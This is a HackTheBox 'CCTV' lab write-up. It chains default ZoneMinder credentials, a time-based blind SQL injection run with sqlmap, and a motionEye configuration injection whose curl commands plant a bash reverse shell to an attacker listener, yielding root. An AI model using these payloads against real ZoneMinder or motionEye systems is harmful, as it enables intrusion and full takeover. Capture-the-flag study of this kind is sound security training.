---
layout: '@/templates/BasePost.astro'
title: CCTV Writeup HTB
description: Chaining ZoneMinder blind SQLi (CVE-2024-51482) and motionEye config injection (CVE-2025-60787) to achieve remote code execution as root on HackTheBox CCTV.
pubDate: 2026-06-20T00:00:00Z
imgSrc: 'https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/9867e8b14b7602881160973ebb50b2c4.png'
imgAlt: 'CCTV HTB box avatar'
tags: ['htb', 'linux', 'medium', 'rce', 'privesc']
---

# CCTV — HackTheBox Writeup

**Difficulty:** Medium
**OS:** Ubuntu 24.04.4 LTS

---

## Reconnaissance

### Nmap Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

### Web Enumeration

Port 80 serves a static site for "SecureVision CCTV & Security Solutions". The Staff Login link points to `/zm` — **ZoneMinder v1.37.63**.

---

## Foothold

### Step 1: ZoneMinder Default Credentials

The ZoneMinder login at `http://cctv.htb/zm` accepts default credentials:

```
admin:admin
```

The console exposes three users via the API at `/zm/api/users.json`:

| ID | Username   | System Privilege |
|----|------------|------------------|
| 1  | superadmin | Edit             |
| 2  | mark       | View             |
| 3  | admin      | View             |

### Step 2: CVE-2024-51482 — ZoneMinder Time-Based Blind SQLi

ZoneMinder v1.37.63 is vulnerable to SQL injection in the `removetag` action of `web/ajax/event.php` via the `tid` parameter.

**Confirming injection (time-based):**

```
GET /zm/index.php?view=request&request=event&action=removetag&tid=1 AND (SELECT 3831 FROM (SELECT(SLEEP(5)))UoVc)
Cookie: ZMSESSID=<authenticated_session>
```

**sqlmap command:**

```bash
sqlmap -u "http://cctv.htb/zm/index.php?view=request&request=event&action=removetag&tid=1" \
  --cookie="ZMSESSID=8cnb4o5i1sbddmkibv185dbd6d" --batch --dbms=mysql -p tid \
  --technique=T --time-sec=5
```

This dumps bcrypt password hashes for all users from the `zm.Users` table.

### Step 3: SSH as mark

Using credentials recovered from the database:

```bash
ssh mark@cctv.htb
# Password: opensesame
```

---

## Privilege Escalation

### Internal Service Enumeration

From mark's session, several internal services are listening on localhost:

```
127.0.0.1:8765  — motionEye 0.43.1b4 (web UI)
127.0.0.1:7999  — motion HTTP control interface
127.0.0.1:9081  — motion MJPEG stream
127.0.0.1:3306  — MySQL
127.0.0.1:8554  — RTSP server
```

### motionEye Discovery

- **motionEye 0.43.1b4** runs as **root** (`/etc/systemd/system/motioneye.service` → `User=root`)
- Config at `/etc/motioneye/motion.conf` contains the admin password hash:
  ```
  # @admin_password 989c5a8ee87a0e9521ec81a79187d162109282f0
  ```
- `/opt/video/backups/server.log` shows `sa_mark` regularly querying the motionEye API

### Step 4: CVE-2025-60787 — motionEye RCE via Config Parameter Injection

motionEye <= 0.43.1b4 does not sanitize configuration values written to the motion daemon. Shell metacharacters injected into parameters like `picture_filename` are executed when motion processes images.

The motion HTTP control interface on port **7999** allows config changes without authentication.

**Exploit chain:**

```bash
# 1. Enable picture output
curl -s "http://127.0.0.1:7999/1/config/set?picture_output=on"

# 2. Inject reverse shell into picture_filename
curl -s "http://127.0.0.1:7999/1/config/set?picture_filename=%24%28bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.xx.xx.xx%2F4444%200%3E%261%27%29"

# 3. Enable emulated motion to trigger image capture
curl -s "http://127.0.0.1:7999/1/config/set?emulate_motion=on"

# 4. Trigger snapshot — executes the injected command
curl -s "http://127.0.0.1:7999/1/action/snapshot"
```

**On the attacker machine:**

```bash
nc -nlvp 4444
# Receive root shell
```

### Flags

```bash
cat /home/sa_mark/user.txt
cat /root/root.txt
```

---

## Attack Chain Summary

```
Web Recon
 └─► ZoneMinder v1.37.63 (admin:admin)
      └─► CVE-2024-51482 Time-Based Blind SQLi on tid parameter
           └─► Credentials dumped from zm.Users
                └─► SSH as mark (opensesame)
                     └─► Internal motion service on port 7999
                          └─► CVE-2025-60787 picture_filename command injection
                               └─► Root shell via reverse bash
```

---

## Tools Used

- nmap
- sqlmap
- curl
- CVE-2024-51482 PoC (BwithE/CVE-2024-51482)
- netcat

## CVEs Exploited

- **CVE-2024-51482** — ZoneMinder v1.37.* <= 1.37.64 Boolean/Time-Based Blind SQL Injection
- **CVE-2025-60787** — motionEye <= 0.43.1b4 RCE via unsanitized config parameters
